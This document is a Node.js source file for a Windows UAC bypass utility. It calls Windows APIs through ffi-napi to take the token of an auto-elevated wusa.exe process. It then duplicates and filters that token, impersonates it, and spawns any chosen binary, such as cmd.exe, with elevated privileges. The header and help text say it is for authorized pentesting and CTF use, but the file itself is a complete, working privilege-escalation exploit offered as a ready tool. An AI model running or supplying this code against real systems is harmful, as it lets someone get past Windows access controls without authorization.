#!/usr/bin/env node

/**
 * UAC Bypass Utility for Windows Security Testing
 * Node.js implementation of UAC token manipulation
 *
 * IMPORTANT: This tool is for authorized security testing only.
 * Use only in pentesting engagements, CTF challenges, or security research.
 */

const ffi = require('ffi-napi');
const ref = require('ref-napi');
const Struct = require('ref-struct-napi');
const path = require('path');

// Define basic types
const DWORD = ref.types.uint32;
const UINT = ref.types.uint32;
const BOOL = ref.types.bool;
const HANDLE = ref.refType(ref.types.void);
const LPVOID = ref.refType(ref.types.void);
const LPCWSTR = ref.types.CString;
const LPWSTR = ref.types.CString;
const WORD = ref.types.uint16;
const BYTE = ref.types.uint8;
const INT = ref.types.int32;

// Define Windows structures
const PROCESS_INFORMATION = Struct({
    hProcess: HANDLE,
    hThread: HANDLE,
    dwProcessId: DWORD,
    dwThreadId: DWORD
});

const SECURITY_ATTRIBUTES = Struct({
    nLength: INT,
    lpSecurityDescriptor: LPVOID,
    bInheritHandle: INT
});

const SID_AND_ATTRIBUTES = Struct({
    Sid: LPVOID,
    Attributes: DWORD
});

const TOKEN_MANDATORY_LABEL = Struct({
    Label: SID_AND_ATTRIBUTES
});

const STARTUPINFOW = Struct({
    cb: DWORD,
    lpReserved: LPWSTR,
    lpDesktop: LPWSTR,
    lpTitle: LPWSTR,
    dwX: DWORD,
    dwY: DWORD,
    dwXSize: DWORD,
    dwYSize: DWORD,
    dwXCountChars: DWORD,
    dwYCountChars: DWORD,
    dwFillAttribute: DWORD,
    dwFlags: DWORD,
    wShowWindow: WORD,
    cbReserved2: WORD,
    lpReserved2: LPVOID,
    hStdInput: HANDLE,
    hStdOutput: HANDLE,
    hStdError: HANDLE
});

const SHELLEXECUTEINFOW = Struct({
    cbSize: INT,
    fMask: UINT,
    hwnd: LPVOID,
    lpVerb: LPWSTR,
    lpFile: LPWSTR,
    lpParameters: LPWSTR,
    lpDirectory: LPWSTR,
    nShow: INT,
    hInstApp: LPVOID,
    lpIDList: LPVOID,
    lpClass: LPWSTR,
    hkeyClass: LPVOID,
    dwHotKey: DWORD,
    hIcon: LPVOID,
    hProcess: HANDLE
});

const SID_IDENTIFIER_AUTHORITY = Struct({
    Value: ref.types.CString // 6 bytes
});

// Load Windows DLLs
const kernel32 = ffi.Library('kernel32', {
    'OpenProcess': [HANDLE, [DWORD, BOOL, DWORD]],
    'TerminateProcess': [BOOL, [HANDLE, UINT]],
    'GetLastError': [DWORD, []]
});

const advapi32 = ffi.Library('advapi32', {
    'OpenProcessToken': [BOOL, [HANDLE, DWORD, ref.refType(HANDLE)]],
    'DuplicateTokenEx': [BOOL, [HANDLE, DWORD, ref.refType(SECURITY_ATTRIBUTES), INT, INT, ref.refType(HANDLE)]],
    'AllocateAndInitializeSid': [BOOL, [
        ref.refType(SID_IDENTIFIER_AUTHORITY),
        BYTE,
        DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD,
        ref.refType(LPVOID)
    ]],
    'ImpersonateLoggedOnUser': [BOOL, [HANDLE]],
    'CreateProcessWithLogonW': [BOOL, [
        LPWSTR,  // userName
        LPWSTR,  // domain
        LPWSTR,  // password
        DWORD,   // logonFlags
        LPWSTR,  // applicationName
        LPWSTR,  // commandLine
        DWORD,   // creationFlags
        LPVOID,  // environment
        LPWSTR,  // currentDirectory
        ref.refType(STARTUPINFOW),
        ref.refType(PROCESS_INFORMATION)
    ]]
});

const ntdll = ffi.Library('ntdll', {
    'NtSetInformationToken': [INT, [HANDLE, INT, ref.refType(TOKEN_MANDATORY_LABEL), INT]],
    'NtFilterToken': [INT, [HANDLE, DWORD, LPVOID, LPVOID, LPVOID, ref.refType(HANDLE)]]
});

const shell32 = ffi.Library('shell32', {
    'ShellExecuteExW': [BOOL, [ref.refType(SHELLEXECUTEINFOW)]]
});

// Constants
const TOKEN_QUERY = 0x0008;
const TOKEN_DUPLICATE = 0x0002;
const TOKEN_ASSIGN_PRIMARY = 0x0001;
const TOKEN_IMPERSONATE = 0x0004;
const TOKEN_ALL_ACCESS = 0xf01ff;
const MAXIMUM_ALLOWED = 0x02000000;
const PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
const SecurityImpersonation = 2;
const TokenPrimary = 1;
const TokenImpersonation = 2;
const SE_GROUP_INTEGRITY = 0x20;
const LOGON_NETCREDENTIALS_ONLY = 0x00000002;
const CREATE_UNICODE_ENVIRONMENT = 0x00000400;
const CREATE_NO_WINDOW = 0x08000000;
const SEE_MASK_NOCLOSEPROCESS = 0x40;
const SW_HIDE = 0x0;
const SW_SHOW = 0x1;
const STARTF_USESHOWWINDOW = 0x00000001;
const TokenIntegrityLevel = 25;
const LUA_TOKEN = 0x4;

// Utility functions
function log(message) {
    console.log(`[*] ${message}`);
}

function error(message) {
    console.log(`[!] ${message}`);
}

function success(message) {
    console.log(`[+] ${message}`);
}

function testElevatedAccess() {
    try {
        const fs = require('fs');
        const testPath = 'C:\\Windows\\System32\\test.txt';
        fs.writeFileSync(testPath, 'test');
        fs.unlinkSync(testPath);
        return true;
    } catch (err) {
        return false;
    }
}

// Main UAC bypass function
function performUACBypass(binPath, args, procPID) {
    log('Starting UAC bypass process...');

    // Test if already elevated
    if (testElevatedAccess()) {
        error('Session is already elevated!');
        process.exit(1);
    } else {
        log('Session is not elevated - proceeding with bypass');
    }

    let hProcess;
    let shellInfo;

    if (procPID) {
        // Use existing process
        log(`Attempting to use process PID: ${procPID}`);
        hProcess = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, procPID);

        if (hProcess.isNull()) {
            error('Failed to get process handle!');
            error(`Last error: ${kernel32.GetLastError()}`);
            process.exit(1);
        }
        log(`Successfully acquired process handle for PID ${procPID}`);
    } else {
        // Create new WUSA process
        log('Creating WUSA process...');
        shellInfo = new SHELLEXECUTEINFOW();
        shellInfo.cbSize = SHELLEXECUTEINFOW.size;
        shellInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        shellInfo.lpFile = 'wusa.exe';
        shellInfo.nShow = SW_HIDE;
        shellInfo.hwnd = ref.NULL;
        shellInfo.lpVerb = ref.NULL;
        shellInfo.lpParameters = ref.NULL;
        shellInfo.lpDirectory = ref.NULL;
        shellInfo.hInstApp = ref.NULL;

        const result = shell32.ShellExecuteExW(shellInfo.ref());
        if (!result) {
            error('Failed to create WUSA process!');
            error(`Last error: ${kernel32.GetLastError()}`);
            process.exit(1);
        }
        log('WUSA process created');
        hProcess = shellInfo.hProcess;
    }

    // Open process token
    log('Opening process token...');
    const hToken = ref.alloc(HANDLE);
    if (!advapi32.OpenProcessToken(hProcess, MAXIMUM_ALLOWED, hToken)) {
        error('Failed to open process token!');
        error(`Last error: ${kernel32.GetLastError()}`);
        process.exit(1);
    }
    log('Opened process token');

    // Duplicate token
    log('Duplicating process token...');
    const hNewToken = ref.alloc(HANDLE);
    const secAttr = new SECURITY_ATTRIBUTES();
    secAttr.nLength = SECURITY_ATTRIBUTES.size;
    secAttr.lpSecurityDescriptor = ref.NULL;
    secAttr.bInheritHandle = 0;

    if (!advapi32.DuplicateTokenEx(
        hToken.deref(),
        TOKEN_ALL_ACCESS,
        secAttr.ref(),
        SecurityImpersonation,
        TokenPrimary,
        hNewToken
    )) {
        error('Failed to duplicate process token!');
        error(`Last error: ${kernel32.GetLastError()}`);
        process.exit(1);
    }
    log('Duplicated process token');

    // Initialize SID for medium integrity level
    log('Initializing MedIL SID...');
    const sidAuth = new SID_IDENTIFIER_AUTHORITY();
    sidAuth.Value = Buffer.from([0x0, 0x0, 0x0, 0x0, 0x0, 0x10]);

    const pSID = ref.alloc(LPVOID);
    if (!advapi32.AllocateAndInitializeSid(
        sidAuth.ref(),
        1,
        0x2000, 0, 0, 0, 0, 0, 0, 0,
        pSID
    )) {
        error('Failed to initialize SID!');
        error(`Last error: ${kernel32.GetLastError()}`);
        process.exit(1);
    }
    log('Initialized MedIL SID');

    // Set token integrity level
    log('Setting token mandatory IL...');
    const sidAndAttr = new SID_AND_ATTRIBUTES();
    sidAndAttr.Sid = pSID.deref();
    sidAndAttr.Attributes = SE_GROUP_INTEGRITY;

    const tokenLabel = new TOKEN_MANDATORY_LABEL();
    tokenLabel.Label = sidAndAttr;

    const ntStatus = ntdll.NtSetInformationToken(
        hNewToken.deref(),
        TokenIntegrityLevel,
        tokenLabel.ref(),
        TOKEN_MANDATORY_LABEL.size
    );

    if (ntStatus !== 0) {
        error('Failed to modify token!');
        error(`NT Status: ${ntStatus}`);
        process.exit(1);
    }
    log('Lowered token mandatory IL');

    // Create restricted token
    log('Creating restricted token...');
    const luaToken = ref.alloc(HANDLE);
    const ntStatus2 = ntdll.NtFilterToken(
        hNewToken.deref(),
        LUA_TOKEN,
        ref.NULL,
        ref.NULL,
        ref.NULL,
        luaToken
    );

    if (ntStatus2 !== 0) {
        error('Failed to create restricted token!');
        error(`NT Status: ${ntStatus2}`);
        process.exit(1);
    }
    log('Created restricted token');

    // Duplicate restricted token
    log('Duplicating restricted token...');
    const hFinalToken = ref.alloc(HANDLE);
    const secAttr2 = new SECURITY_ATTRIBUTES();
    secAttr2.nLength = SECURITY_ATTRIBUTES.size;
    secAttr2.lpSecurityDescriptor = ref.NULL;
    secAttr2.bInheritHandle = 0;

    if (!advapi32.DuplicateTokenEx(
        luaToken.deref(),
        TOKEN_IMPERSONATE | TOKEN_QUERY,
        secAttr2.ref(),
        SecurityImpersonation,
        TokenImpersonation,
        hFinalToken
    )) {
        error('Failed to duplicate restricted token!');
        error(`Last error: ${kernel32.GetLastError()}`);
        process.exit(1);
    }
    log('Duplicated restricted token');

    // Impersonate security context
    log('Impersonating security context...');
    if (!advapi32.ImpersonateLoggedOnUser(hFinalToken.deref())) {
        error('Failed to impersonate context!');
        error(`Last error: ${kernel32.GetLastError()}`);
        process.exit(1);
    }
    log('Successfully impersonated security context');

    // Prepare to spawn elevated process
    log('Preparing to spawn elevated process...');
    const startupInfo = new STARTUPINFOW();
    startupInfo.cb = STARTUPINFOW.size;
    startupInfo.dwFlags = STARTF_USESHOWWINDOW;
    startupInfo.wShowWindow = SW_SHOW;
    startupInfo.lpReserved = ref.NULL;
    startupInfo.lpDesktop = ref.NULL;
    startupInfo.lpTitle = ref.NULL;

    const processInfo = new PROCESS_INFORMATION();

    const currentDir = process.env.SystemRoot || 'C:\\Windows';
    const commandLine = args ? `${binPath} ${args}` : binPath;

    // Spawn elevated process
    log(`Spawning: ${commandLine}`);
    if (!advapi32.CreateProcessWithLogonW(
        'aaa',
        'bbb',
        'ccc',
        LOGON_NETCREDENTIALS_ONLY,
        binPath,
        commandLine,
        CREATE_NO_WINDOW,
        ref.NULL,
        currentDir,
        startupInfo.ref(),
        processInfo.ref()
    )) {
        error('Failed to create process!');
        error(`Last error: ${kernel32.GetLastError()}`);
        process.exit(1);
    }

    success('Magic... Process spawned with elevated privileges!');
    log(`Process ID: ${processInfo.dwProcessId}`);

    // Cleanup: Kill WUSA if we created it
    if (!procPID && shellInfo) {
        log('Cleaning up WUSA process...');
        kernel32.TerminateProcess(shellInfo.hProcess, 1);
    }

    log('UAC bypass completed successfully!');
}

// CLI argument parsing
function main() {
    const args = process.argv.slice(2);

    if (args.length === 0 || args.includes('--help') || args.includes('-h')) {
        console.log(`
UAC Bypass Tool - Node.js Implementation
=========================================

IMPORTANT: For authorized security testing only!
Use only in pentesting engagements, CTF challenges, or security research.

Usage:
  node index.js <binary_path> [arguments] [--pid <process_id>]

Options:
  <binary_path>     Path to the executable to run elevated (required)
  [arguments]       Arguments to pass to the executable (optional)
  --pid <id>        Use existing process instead of WUSA (optional)
  --help, -h        Show this help message

Examples:
  node index.js C:\\Windows\\System32\\cmd.exe
  node index.js C:\\Windows\\System32\\cmd.exe "/c whoami /priv"
  node index.js C:\\Windows\\System32\\cmd.exe --pid 1234

Requirements:
  - Windows OS
  - Node.js with ffi-napi support
  - Run 'npm install' before first use
        `);
        process.exit(0);
    }

    // Parse arguments
    let binPath = args[0];
    let procArgs = '';
    let procPID = null;

    for (let i = 1; i < args.length; i++) {
        if (args[i] === '--pid' && i + 1 < args.length) {
            procPID = parseInt(args[i + 1]);
            i++; // Skip next arg
        } else {
            procArgs += (procArgs ? ' ' : '') + args[i];
        }
    }

    // Validate inputs
    if (!binPath) {
        error('Binary path is required!');
        process.exit(1);
    }

    // Run the bypass
    try {
        performUACBypass(binPath, procArgs, procPID);
    } catch (err) {
        error(`Unexpected error: ${err.message}`);
        console.error(err.stack);
        process.exit(1);
    }
}

// Run if executed directly
if (require.main === module) {
    main();
}

module.exports = { performUACBypass };
